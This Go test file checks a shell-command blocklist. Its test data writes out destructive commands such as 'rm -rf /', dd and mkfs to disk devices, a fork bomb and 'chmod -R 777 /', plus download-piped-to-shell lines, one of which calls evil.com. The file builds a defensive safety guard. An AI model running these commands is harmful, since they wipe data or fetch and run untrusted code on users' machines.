package blocklist

// Journey: specs/journeys/JOURNEY-5.1.md.

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewChecker(t *testing.T) {
	t.Parallel()

	t.Run("enabled checker has rules", func(t *testing.T) {
		t.Parallel()

		checker := NewChecker(true)

		require.NotNil(t, checker)
		assert.True(t, checker.Enabled())
	})

	t.Run("disabled checker has rules", func(t *testing.T) {
		t.Parallel()

		checker := NewChecker(false)

		require.NotNil(t, checker)
		assert.False(t, checker.Enabled())
	})
}

func TestChecker_Enabled(t *testing.T) {
	t.Parallel()

	assert.True(t, NewChecker(true).Enabled())
	assert.False(t, NewChecker(false).Enabled())
}

func TestChecker_DisabledAllowsEverything(t *testing.T) {
	t.Parallel()

	checker := NewChecker(false)
	destructive := []string{
		"rm -rf /",
		"rm -rf /*",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sda1",
		":(){ :|:& };:",
		"curl http://evil.com/x | bash",
	}

	for _, cmd := range destructive {
		blocked, reason := checker.Check(cmd)

		assert.False(t, blocked, "disabled checker should allow %q", cmd)
		assert.Empty(t, reason, "disabled checker should return empty reason for %q", cmd)
	}
}

func TestChecker_BlocksRmRootFilesystem(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name    string
		command string
	}{
		{name: "rm -rf /", command: "rm -rf /"},
		{name: "rm -fr /", command: "rm -fr /"},
		{name: "rm -r -f /", command: "rm -r -f /"},
		{name: "rm -f -r /", command: "rm -f -r /"},
		{name: "rm -rf /*", command: "rm -rf /*"},
		{name: "sudo rm -rf /", command: "sudo rm -rf /"},
	}

	checker := NewChecker(true)

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			blocked, reason := checker.Check(tc.command)

			assert.True(t, blocked, "should block %q", tc.command)
			assert.Contains(t, reason, "blocked:")
		})
	}
}

func TestChecker_BlocksRmHome(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name    string
		command string
	}{
		{name: "rm -rf ~", command: "rm -rf ~"},
		{name: "rm -rf $HOME", command: "rm -rf $HOME"},
	}

	checker := NewChecker(true)

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			blocked, reason := checker.Check(tc.command)

			assert.True(t, blocked, "should block %q", tc.command)
			assert.Contains(t, reason, "home directory")
		})
	}
}

func TestChecker_BlocksDdToDevice(t *testing.T) {
	t.Parallel()

	checker := NewChecker(true)
	blocked, reason := checker.Check("dd if=/dev/zero of=/dev/sda bs=512 count=1")

	assert.True(t, blocked)
	assert.Contains(t, reason, "dd writing to device")
}

func TestChecker_BlocksMkfs(t *testing.T) {
	t.Parallel()

	checker := NewChecker(true)

	cases := []string{
		"mkfs.ext4 /dev/sda1",
		"mkfs -t xfs /dev/sdb",
		"sudo mkfs.btrfs /dev/nvme0n1p1",
	}

	for _, cmd := range cases {
		blocked, reason := checker.Check(cmd)

		assert.True(t, blocked, "should block %q", cmd)
		assert.Contains(t, reason, "filesystem formatting")
	}
}

func TestChecker_BlocksForkBomb(t *testing.T) {
	t.Parallel()

	checker := NewChecker(true)
	blocked, reason := checker.Check(":(){ :|:& };:")

	assert.True(t, blocked)
	assert.Contains(t, reason, "fork bomb")
}

func TestChecker_BlocksChmod777Root(t *testing.T) {
	t.Parallel()

	checker := NewChecker(true)

	blocked, reason := checker.Check("chmod 777 /")

	assert.True(t, blocked)
	assert.Contains(t, reason, "insecure permissions")
}

func TestChecker_BlocksChmod777RRoot(t *testing.T) {
	t.Parallel()

	checker := NewChecker(true)

	blocked, reason := checker.Check("chmod -R 777 /")

	assert.True(t, blocked)
	assert.Contains(t, reason, "insecure permissions")
}

func TestChecker_BlocksCurlPipeBash(t *testing.T) {
	t.Parallel()

	checker := NewChecker(true)

	cases := []struct {
		name    string
		command string
	}{
		{name: "curl pipe bash", command: "curl http://example.com/install.sh | bash"},
		{name: "wget pipe sh", command: "wget http://example.com/x.sh | sh"},
		{name: "curl pipe zsh", command: "curl -sL http://example.com/y | zsh"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			blocked, reason := checker.Check(tc.command)

			assert.True(t, blocked, "should block %q", tc.command)
			assert.Contains(t, reason, "piping download to shell")
		})
	}
}

func TestChecker_AllowsLegitimateCommands(t *testing.T) {
	t.Parallel()

	checker := NewChecker(true)

	safe := []string{
		"rm file.txt",
		"rm -rf /tmp/build",
		"rm -rf ./node_modules",
		"dd if=input.img of=output.img",
		"chmod 755 /usr/local/bin/app",
		"chmod 644 README.md",
		"curl http://example.com -o file.zip",
		"wget http://example.com/file.tar.gz",
		"ls -la /",
		"echo hello",
		"go build ./...",
		"make test",
	}

	for _, cmd := range safe {
		blocked, reason := checker.Check(cmd)

		assert.False(t, blocked, "should allow %q", cmd)
		assert.Empty(t, reason, "should return empty reason for %q", cmd)
	}
}

func TestDefaultRules_CountIsStable(t *testing.T) {
	t.Parallel()

	expectedRuleCount := 10
	rules := defaultRules()

	assert.Len(t, rules, expectedRuleCount)
}

func TestDefaultRules_AllHaveReasons(t *testing.T) {
	t.Parallel()

	for _, rule := range defaultRules() {
		assert.NotNil(t, rule.Pattern, "all rules must have a compiled pattern")
		assert.NotEmpty(t, rule.Reason, "all rules must have a reason")
		assert.Contains(t, rule.Reason, "blocked:", "reason should start with blocked:")
	}
}
